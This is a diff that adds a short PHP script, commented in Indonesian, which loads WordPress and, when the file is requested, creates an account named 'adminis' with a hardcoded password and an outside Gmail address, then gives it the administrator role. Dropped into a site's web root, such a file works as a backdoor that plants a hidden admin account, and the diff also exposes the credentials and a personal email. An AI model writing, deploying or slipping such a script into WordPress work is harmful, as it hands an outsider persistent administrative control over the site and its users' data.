@@ -1,0 +1,28 @@
+<?php
+// Load WordPress
+require_once('wp-load.php');
+
+// Konfigurasi akun baru
+$username = 'adminis';
+$password = 'anomalimin@';
+$email = 'ziziarus518@gmail.com';
+$role = 'administrator'; // Ubah sesuai kebutuhan ('editor', 'author', 'subscriber', dll.)
+
+// Periksa apakah username atau email sudah ada
+if (username_exists($username) || email_exists($email)) {
+    die('Error: Username atau email sudah terdaftar.');
+}
+
+// Buat user baru
+$user_id = wp_create_user($username, $password, $email);
+
+if (is_wp_error($user_id)) {
+    die('Error: Tidak dapat membuat pengguna.');
+}
+
+// Atur peran pengguna
+$user = new WP_User($user_id);
+$user->set_role($role);
+
+echo "User berhasil dibuat: $username ($role)";
+?>
